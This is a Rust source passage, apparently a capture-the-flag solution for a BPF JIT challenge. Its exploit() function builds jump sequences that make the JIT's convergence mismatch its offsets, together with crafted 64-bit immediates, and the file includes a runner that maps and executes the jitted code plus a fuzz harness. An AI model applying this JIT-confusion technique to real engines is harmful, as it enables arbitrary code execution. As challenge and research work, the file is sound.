    let size = PROLOGUELEN + 1000000 + 8 * instructions.len() + EPILOGUELEN;
    let mut image: Vec<u8> = vec![0; size];

    // one time is enough
    let output_size = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();

    disassemble(&image[PROLOGUELEN..output_size - EPILOGUELEN], "some_instructions")
}

fn disassemble(code: &[u8], name: &str) {
    let f1 = &format!("{}.machine_code", name);
    let f2 = &format!("{}.assembly", name);

    std::fs::File::create(f1).unwrap().write_all(code).unwrap();

    let out = Command::new("ndisasm")
        .args(["-b", "64"])
        .arg(&f1)
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .output().unwrap();

    std::fs::write(f2, out.stdout.as_slice()).unwrap();
}

fn add_immediate(space: &mut Vec<BpfInstT>, value: u64) {
    // make sure that this will be 8 bytes
    assert!(!is_uimm32!(value));
    space.push(BpfInstT { opc: 0x18, regs: 0, off: 0, imm: value as u32 as i32 });
    space.push(BpfInstT { opc: 0, regs: 0, off: 0, imm: (value >> 32) as u32 as i32 });
}

fn exploit() {
    let mut instructions = vec![];

    // shrink 2
    // off: 5 2 10 2 bytes
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 2 + 1 + 10*2 + 4, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 1 + 1 + 11*2 + 5, imm: 0 });
    instructions.push(BpfInstT { opc: 5, regs: 0, off: 0 + 1 + 11*2 + 7, imm: 0 });

    // shrink 1
    // instructions.push(BpfInstT { opc: 5, regs: 0, off: 11*2 + 8, imm: 0 }); // 11*10b + 8*2b = 126b
    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });

    for _ in 0..11 {
        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
    }

    let n = 9;
    for i in 0..n {
        if i == 0 {
            // off: 16 + 2|5 + 100 + 8 bytes
            instructions.push(BpfInstT { opc: 5, regs: 0, off: (n-1) + 1 + 10*2 + 4, imm: 0 });
        } else {
            instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
        }
    }

    // off: 2|5 2 10
    instructions.push(BpfInstT { opc: 5, regs: 0, off: -1 - n - 10*2, imm: 0 });

    for _ in 0..10 {
        add_immediate(&mut instructions, 0xb7b6b5b4b3b2b1b0);
    }
    for _ in 0..8 {
        instructions.push(BpfInstT { opc: 5, regs: 0, off: -1, imm: 0 });
    }

    run(&instructions);
}

fn sizeof(i: &BpfInstT) -> usize {
    let mut instructions: Vec<BpfInstT> = Vec::with_capacity(u16::MAX as usize);
    instructions.push(i.clone());
    instructions.push(i.clone());

    let plen = PROLOGUELEN as u32;
    let mut addrs: Vec<u32> = (0..instructions.len() + 1).map(|i| plen + 64 * i as u32).collect();
    let size = PROLOGUELEN + 1000 + 8 * instructions.len() + EPILOGUELEN;
    let mut image: Vec<u8> = vec![0; size];
    let x = do_jit(instructions.as_slice(), addrs.as_mut_slice(), Some(&mut image)).unwrap();
    let size = (x - PROLOGUELEN - EPILOGUELEN) / 2;

    println!("sizeof {:?} is {} bytes", i, size);
    size
}

fn main() {
    // disassemble_some_instructions();
    // return;

    // posible_sizes();
    // return;

    // print_all();
    // return;

    exploit();
    return;

    print!("Input: ");
    io::stdout().flush().unwrap();
    let mut buffer = String::new();
    io::stdin().read_line(&mut buffer).unwrap();

    if let Ok(inbytes) = hex::decode(buffer.trim()) {
        if inbytes.len() > MAXBPFINST * 8 {
            println!("Input Too Large!");
            return;
        }

        if let Some(insts) = parse_raw_bytes(&inbytes) {
            run(&insts)
        } else {
            println!("Incomplete Bytecode in Input!");
        }
    } else {
        println!("Bad Input in Hex!");
    }
}

// NOTE: I extracted this method
pub fn run(insts: &Vec<BpfInstT>) {
    match verify_jmps(&insts) {
        Ok(_) => (),
        Err(e) => {
            println!("{}", e);
            return;
        },
    };

    let mut olen = insts.len() * 64;
    let plen = PROLOGUELEN as u32;
    let mut addrs: Vec<u32> = (0..insts.len() + 1).map(|i| plen + 64 * i as u32).collect();
    let mut addrs_clone = addrs.clone();

    let mut flag = false;

    println!("olen {} {:?}", olen, addrs);
    for _ in 0..20 {
        addrs_clone.copy_from_slice(&addrs);

        if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
            println!("nlen {}", nlen);
            if nlen == olen {
                println!("flag=true, (addrs==addrs_clone) is {}", addrs == addrs_clone);
                flag = true;
                break;
            }

            olen = nlen;
        } else {
            break;
        }
    }
    let mut image: [u8; 8192 + PROLOGUELEN + EPILOGUELEN] = [0; 8192 + PROLOGUELEN + EPILOGUELEN];

    assert!(flag, "flag");
    if flag {
        if let Some(nlen) = do_jit(&insts, &mut addrs, Some(&mut image)) {
            if nlen == olen {
                let mut final_buffer = MmapMut::map_anon(MAXBPFINST * 64 + PROLOGUELEN + EPILOGUELEN).unwrap();

                final_buffer.as_mut().copy_from_slice(&image);

                disassemble(&image[0..nlen], "run");

                let final_buffer = final_buffer.make_exec().unwrap();
                let func = unsafe {
                    mem::transmute::<*const u8, fn() -> i32>(final_buffer.as_ptr())
                };

                println!("Running jitted code:");
                io::stdout().flush().unwrap();
                func();
            }
        }
    }
}

#[derive(Debug)]
pub struct FuzzInput {
    pub instructions: Vec<BpfInstT>
}

impl<'a> Arbitrary<'a> for FuzzInput {
    fn arbitrary(u: &mut Unstructured<'a>) -> arbitrary::Result<Self> {
        let len = u.arbitrary_len::<BpfInstT>()? % MAXBPFINST;
        let mut instructions = Vec::with_capacity(len.into());
        for i in 0..len {
            let index = (u16::arbitrary(u)? % (MAXBPFINST as u16 + 1)) as i16; // reduce the possibilities
            let off = index - (i as i16 + 1);
            let imm = i16::arbitrary(u)? as i32; // reduce the possibilities
            let regs = loop {
                let regs = u8::arbitrary(u)?;
                if (regs & 0xf0) > 0x90 || (regs & 0x0f) > 0x09 {
                    continue;
                }
                break regs;
            };
            loop {
                let opc = loop {
                    let opc = u8::arbitrary(u)?;
                    if is_supported(opc) {
                        break opc;
                    }
                };
                let inst = BpfInstT {
                    opc: opc as u8,
                    regs: regs as u8,
                    off,
                    imm,
                };
                if inst.code().is_some() {
                    instructions.push(inst);
                    break;
                }
            };
        }
        Ok(FuzzInput{instructions})
    }
}

pub fn fuzz(insts: Vec<BpfInstT>) {
    if verify_jmps(&insts).is_ok() {
        let mut olen = insts.len() * 64;
        let plen = PROLOGUELEN as u32;
        let mut addrs: Vec<u32> = (0..insts.len() + 1).map(|i| plen + 64 * i as u32).collect();
        let mut addrs2: Vec<u32> = addrs.clone();

        for _ in 0..20 {
            addrs2.copy_from_slice(&addrs);
            if let Some(nlen) = do_jit(&insts, &mut addrs, None) {
                if nlen == olen {
                    if addrs2 != addrs {
                        println!("same length but different!");
                        assert_eq!(addrs2, addrs, "same length but different!");
                    }
                    break;
                }
                olen = nlen;
            } else {
                break;
            }
        }
    }
}
